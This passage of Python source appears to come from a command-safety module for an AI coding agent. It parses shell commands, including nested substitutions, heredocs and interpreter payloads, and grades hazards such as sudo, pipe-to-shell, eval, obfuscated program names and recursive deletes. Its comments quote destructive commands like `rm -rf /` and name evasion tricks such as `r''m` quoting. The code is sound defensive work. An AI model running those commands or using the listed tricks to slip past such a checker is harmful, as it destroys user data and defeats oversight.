    items = _Lexer(text).run()
    for group in _group_items(items):
        heredoc_bodies = tuple(here.body for here in group.heredocs)
        binary, argv, prefixes, assignments = resolve_binary([w.value for w in group.words])
        # The raw text of the word that *became* the program, not of the first word in
        # the segment. `resolve_binary` peels leading assignments and wrappers, so those
        # are not the same word -- and comparing the wrong one against `binary` reads as
        # obfuscation. `CFLAGS='-O2 -g' make` was refused outright on that basis: the
        # quotes belong to a compiler flag, and the program name was never hidden.
        # `env -S 'rm -rf /etc'` has no such word at all: the program comes out of a
        # flag's value, so the argv is no longer the tail of what was written and the
        # arithmetic below would land on the flag. An empty raw says "nothing was
        # written to compare against", which is the truth and raises no hazard.
        offset = len(group.words) - len(argv)
        spelled_out = argv and offset >= 0 and group.words[offset].value == argv[0]
        binary_raw = group.words[offset].raw if spelled_out else ""
        segment = Segment(
            raw=text[group.start : group.end].strip(),
            binary=binary,
            argv=argv,
            depth=depth,
            connector=group.connector,
            terminator=group.terminator,
            origin=origin,
            parent=parent,
            binary_raw=binary_raw,
            prefixes=prefixes,
            assignments=assignments,
            redirects=tuple(
                Redirect(operator=r.operator, target=r.target.value) for r in group.redirects
            ),
            heredocs=heredoc_bodies,
        )
        out.append(segment)
        index = len(out) - 1
        _parse_nested(segment, group, heredoc_bodies, out, index, depth)


def _parse_nested(
    segment: Segment,
    group: _Group,
    heredoc_bodies: tuple[str, ...],
    out: list[Segment],
    index: int,
    depth: int,
) -> None:
    for word in (*group.words, *(r.target for r in group.redirects)):
        for inner in word.subs:
            _parse_into(inner, out, depth=depth + 1, parent=index, origin=Origin.SUBSTITUTION)
    if segment.binary in SHELL_EXECUTORS:
        payload = _payload_after(segment.argv, SHELL_COMMAND_FLAGS.get(segment.binary, ("-c",)))
        if payload:
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.SHELL_C)
        for body in heredoc_bodies:
            _parse_into(body, out, depth=depth + 1, parent=index, origin=Origin.HEREDOC)
        for redirect in segment.redirects:
            # `bash <<<"rm -rf /"` executes the word. Same channel as a heredoc body and
            # the same treatment: without this the payload is a redirect target nobody
            # reads, and the only visible binary is a harmless `bash`.
            if redirect.operator.endswith("<<<") and redirect.target.strip():
                _parse_into(
                    redirect.target, out, depth=depth + 1, parent=index, origin=Origin.HEREDOC
                )
    for prefix in segment.prefixes:
        wrapper_flags = WRAPPER_COMMAND_FLAGS.get(prefix)
        if wrapper_flags is None:
            continue
        # The peeled words, not `segment.argv`: the flag and its line were stripped on
        # the way to naming the program, so the argv no longer holds either.
        payload = _payload_after([word.value for word in group.words], tuple(wrapper_flags))
        if payload:
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.SHELL_C)
    if segment.binary in EVAL_BINARIES and len(segment.argv) > 1:
        payload = " ".join(segment.argv[1:])
        # `eval "$(curl …)"` already yielded the inner fetch as a substitution segment;
        # re-parsing the wrapper would duplicate it and invent a nonsense binary.
        if not _is_bare_substitution(payload):
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.EVAL)
    exec_flags = EXEC_ARGUMENT_FLAGS.get(segment.binary)
    if exec_flags is not None:
        for payload in _exec_payloads(segment.argv, exec_flags):
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.EXEC_ARGUMENT)
    command_flags = COMMAND_ARGUMENT_FLAGS.get(segment.binary)
    if command_flags is not None:
        payload = _payload_after(segment.argv, tuple(command_flags))
        if payload:
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.EXEC_ARGUMENT)
    if segment.binary == "git":
        for payload in _config_commands(segment.argv, segment.assignments):
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.EXEC_ARGUMENT)
    for binary, phrase in COMMAND_SUBCOMMANDS:
        if segment.binary != binary:
            continue
        payload = _subcommand_payload(segment.argv, phrase)
        if payload:
            _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.EXEC_ARGUMENT)
    if segment.binary == "sed":
        scripts = [_program_argument(segment.argv, PROGRAM_INTERPRETERS["sed"]) or ""]
        scripts.extend(_payloads_after(segment.argv, _SED_SCRIPT_FLAGS))
        for script in scripts:
            for payload in _sed_commands(script):
                # sed runs it through a shell -- measured, `s/x/echo a | wc -l/e`
                # prints `1`, so the pipe is real.
                _parse_into(payload, out, depth=depth + 1, parent=index, origin=Origin.SHELL_C)
    program_flags = PROGRAM_INTERPRETERS.get(segment.binary)
    if program_flags is not None and segment.binary != "sed":
        program = _program_argument(segment.argv, program_flags)
        if program and _reaches_a_shell(program):
            _parse_into(
                _flatten_code(program),
                out,
                depth=depth + 1,
                parent=index,
                origin=Origin.INTERPRETER,
            )
    flags = CODE_INTERPRETERS.get(segment.binary)
    if flags is not None:
        payload = _payload_after(segment.argv, flags)
        if payload:
            _parse_into(
                _flatten_code(payload),
                out,
                depth=depth + 1,
                parent=index,
                origin=Origin.INTERPRETER,
            )


def _is_bare_substitution(payload: str) -> bool:
    stripped = payload.strip()
    return stripped.startswith(("$(", "`")) and stripped.endswith((")", "`"))


#: Punctuation that separates words in a programming language but glues them together
#: in shell. Flattening it is what lets ``os.system('rm -rf /')`` be seen as ``rm``
#: rather than as one opaque word. It is a heuristic over code, not a language parser,
#: and it is only ever used on an interpreter's inline payload — which is escalated to
#: `ask` on its own merits, so a false split costs a prompt and nothing worse.
_CODE_PUNCTUATION = str.maketrans({",": " ", "'": " ", '"': " ", "+": " "})


def _flatten_code(payload: str) -> str:
    return payload.translate(_CODE_PUNCTUATION)


#: Recursion ceiling for nested substitution. A hand-written string can nest `$( )`
#: arbitrarily deep; parsing must terminate regardless.
_MAX_DEPTH = 6


# --------------------------------------------------------------------------- #
# Structural hazards — analysis only, no permission decisions here
# --------------------------------------------------------------------------- #


class Severity(StrEnum):
    """How much a hazard should weigh. :mod:`ronin.safety.policy` maps this to a
    decision; this module never does."""

    NOTE = "note"
    ASK = "ask"
    BLOCK = "block"


class HazardCode(StrEnum):
    SUDO = "sudo"
    PIPE_INTO_INTERPRETER = "pipe_into_interpreter"
    DECODE_INTO_INTERPRETER = "decode_into_interpreter"
    EVAL = "eval"
    SHELL_C_PAYLOAD = "shell_c_payload"
    INTERPRETER_PAYLOAD = "interpreter_payload"
    HEREDOC_TO_SHELL = "heredoc_to_shell"
    COMMAND_SUBSTITUTION = "command_substitution"
    OBFUSCATED_BINARY = "obfuscated_binary"
    RECURSIVE_DELETE = "recursive_delete"
    STDIN_RECURSIVE_DELETE = "stdin_recursive_delete"
    NO_PRESERVE_ROOT = "no_preserve_root"
    ROOT_GLOB = "root_glob"
    WRITE_TO_DEVICE = "write_to_device"
    IN_PLACE_EDIT = "in_place_edit"
    BACKGROUNDED = "backgrounded"


@dataclass(frozen=True, slots=True)
class Hazard:
    """One structural risk found in a parsed command."""

    code: HazardCode
    severity: Severity
    note: str
    segment: str

    def __str__(self) -> str:
        return f"{self.code.value}: {self.note} — in `{self.segment}`"


_ROOT_GLOBS: frozenset[str] = frozenset({"/*", "/*/*", "~/*", "$HOME/*", "${HOME}/*", "/."})


def hazards(segments: Sequence[Segment]) -> tuple[Hazard, ...]:
    """Every structural risk in a parsed command, in segment order.

    Structural means "visible in the shape of the command, whatever the arguments are":
    a pipe into an interpreter is a hazard even when the payload looks innocent,
    because the payload is not what runs — whatever the left-hand side prints is.
    """
    found: list[Hazard] = []
    for index, segment in enumerate(segments):
        found.extend(_segment_hazards(segments, index, segment))
    return tuple(found)


def _segment_hazards(segments: Sequence[Segment], index: int, segment: Segment) -> Iterator[Hazard]:
    def hazard(code: HazardCode, severity: Severity, note: str) -> Hazard:
        return Hazard(code=code, severity=severity, note=note, segment=segment.raw)

    if PRIVILEGE_ESCALATORS.intersection((*segment.prefixes, segment.binary)):
        yield hazard(
            HazardCode.SUDO,
            Severity.BLOCK,
            "privilege escalation; an agent must not run as root — if this genuinely "
            "needs root, hand the command to the user",
        )
    if segment.binary in SHELL_EXECUTORS and segment.connector == "|":
        previous = segments[index - 1] if index else None
        source = previous.binary if previous is not None else "the previous command"
        yield hazard(
            HazardCode.PIPE_INTO_INTERPRETER,
            Severity.BLOCK,
            f"whatever `{source}` prints becomes the script that runs, so nothing here "
            "can be reviewed — download to a file, read it, then run it",
        )
        if previous is not None and previous.binary in DECODER_BINARIES:
            yield hazard(
                HazardCode.DECODE_INTO_INTERPRETER,
                Severity.BLOCK,
                "a decoded payload piped to a shell hides the command from review",
            )
    if segment.binary in EVAL_BINARIES:
        yield hazard(
            HazardCode.EVAL,
            Severity.BLOCK,
            "`eval` runs text assembled at runtime; write the command out instead",
        )
    if segment.origin is Origin.SHELL_C:
        yield hazard(
            HazardCode.SHELL_C_PAYLOAD,
            Severity.ASK,
            "this came from a `-c` payload rather than the command line",
        )
    if segment.origin is Origin.INTERPRETER:
        yield hazard(
            HazardCode.INTERPRETER_PAYLOAD,
            Severity.ASK,
            "this came from an interpreter's inline code payload",
        )
    if segment.origin is Origin.HEREDOC:
        yield hazard(
            HazardCode.HEREDOC_TO_SHELL,
            Severity.ASK,
            "this came from a heredoc fed to a shell",
        )
    if segment.origin is Origin.SUBSTITUTION:
        yield hazard(
            HazardCode.COMMAND_SUBSTITUTION,
            Severity.NOTE,
            "this runs inside a command substitution",
        )
    if segment.binary and _obfuscated(segment.binary_raw, segment.binary):
        yield hazard(
            HazardCode.OBFUSCATED_BINARY,
            Severity.BLOCK,
            f"the program name is written as {segment.binary_raw!r} but resolves to "
            f"`{segment.binary}` — quoting a binary mid-word only ever hides it",
        )
    if segment.binary == "find" and segment.has_flag("-delete"):
        # `find` always descends, so there is no non-recursive spelling of this and no
        # flag to key on: `-delete` *is* the recursion. Reported as a recursive delete
        # rather than under a code of its own because that is exactly what it is, and a
        # second name for one idea would leave every rule keyed on the first one blind.
        yield hazard(
            HazardCode.RECURSIVE_DELETE,
            Severity.ASK,
            "`find -delete` removes every match beneath the starting point: confirm the "
            "filter is narrow enough, since there is no undo and no listing first",
        )
    if segment.binary == "rm":
        recursive = segment.has_flag("-r", "-R", "--recursive")
        if segment.has_flag("--no-preserve-root"):
            yield hazard(
                HazardCode.NO_PRESERVE_ROOT,
                Severity.BLOCK,
                "--no-preserve-root exists only to defeat the guard that stops `rm -rf /`",
            )
        if recursive and "xargs" in segment.prefixes:
            yield hazard(
                HazardCode.STDIN_RECURSIVE_DELETE,
                Severity.BLOCK,
                "a recursive delete whose targets come from stdin cannot be reviewed "
                "before it runs — list the paths, then delete them explicitly",
            )
        elif recursive:
            yield hazard(
                HazardCode.RECURSIVE_DELETE,
                Severity.ASK,
                "recursive delete: confirm the path is the one you mean",
            )
    for word in segment.operands:
        if word in _ROOT_GLOBS:
            yield hazard(
                HazardCode.ROOT_GLOB,
                Severity.BLOCK,
                f"`{word}` expands to every entry at the top of the filesystem or home",
            )
    for redirect in segment.redirects:
        if redirect.writes and _is_device(redirect.target):
            yield hazard(
                HazardCode.WRITE_TO_DEVICE,
                Severity.BLOCK,
                f"writing to {redirect.target} overwrites a device, not a file",
            )
    if segment.binary in IN_PLACE_EDITORS and segment.has_flag(*IN_PLACE_FLAGS):
        yield hazard(
            HazardCode.IN_PLACE_EDIT,
            Severity.ASK,
            "in-place edit with no backup; the edit tool shows a diff first",
        )
    if segment.terminator == "&":
        yield hazard(
            HazardCode.BACKGROUNDED,
            Severity.NOTE,
            "backgrounded, so its output and exit code are not observed here",
        )


def _obfuscated(raw: str, resolved: str) -> bool:
    """Whether a binary word was written to hide what it resolves to.

    A *fully* quoted word (``'rm'``, ``"rm"``) is not counted: it is what a careful
    script does around a path with spaces. Quotes or escapes *inside* the word
    (``r''m``, ``\\rm``, ``r"m"``) have no other purpose than evading a text match.
    """
    if raw == resolved:
        return False
    if len(raw) >= 2 and raw[0] == raw[-1] and raw[0] in "'\"" and raw[1:-1] == resolved:
        return False
    return any(ch in raw for ch in "'\"\\")


def _is_device(target: str) -> bool:
    return target.startswith("/dev/") and target not in HARMLESS_DEVICES


def worst_severity(found: Sequence[Hazard]) -> Severity | None:
    """The highest severity present, or ``None`` for an empty sequence."""
    order = {Severity.NOTE: 0, Severity.ASK: 1, Severity.BLOCK: 2}
    if not found:
        return None
    return max((h.severity for h in found), key=lambda s: order[s])


__all__ = [
    "CODE_INTERPRETERS",
    "COMMAND_ARGUMENT_FLAGS",
    "COMMAND_SUBCOMMANDS",
    "DECODER_BINARIES",
    "EVAL_BINARIES",
    "EXEC_ARGUMENT_FLAGS",
    "FETCH_BINARIES",
    "HARMLESS_DEVICES",
    "IN_PLACE_EDITORS",
    "IN_PLACE_FLAGS",
    "KEY_SUFFIXES",
    "OUTPUT_FLAGS",
    "PAYLOAD_FLAGS",
    "PRIVILEGE_ESCALATORS",
    "PROGRAM_INTERPRETERS",
    "SECRET_FILES",
    "SECRET_PATHS",
    "SHELL_EXECUTORS",
    "SHELL_KEYWORDS",
    "WRAPPERS",
    "WRAPPER_COMMAND_FLAGS",
    "Hazard",
    "HazardCode",
    "Origin",
    "Redirect",
    "Segment",
    "Severity",
    "hazards",
    "parse_command",
    "resolve_binary",
    "worst_severity",
]
